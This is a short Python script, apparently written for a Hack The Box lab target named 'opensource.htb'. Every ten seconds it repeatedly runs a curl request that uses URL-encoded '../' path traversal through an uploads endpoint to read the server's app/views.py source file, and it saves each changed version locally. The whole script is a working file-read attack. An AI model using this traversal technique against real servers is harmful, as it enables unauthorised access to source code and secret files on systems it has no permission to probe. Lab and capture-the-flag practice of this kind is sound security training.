import os, time

starttime = time.time()
old_input = ""
counter = 1

while True:
    command ="curl http://opensource.htb/uploads/..%2F..%2F..%2F%2F..%2F..%2Fapp/app/views.py"
    new_input = os.popen(command).read()

    if new_input != old_input:
     print("somthing changed")
     os.popen("cp changed_views.py changed_views%d" %counter)
     counter = counter+1
     with open('changed_views.py', 'w') as f:
        f.write(new_input)

    


    old_input = new_input
    time.sleep(10.0 - ((time.time() - starttime) % 10.0))


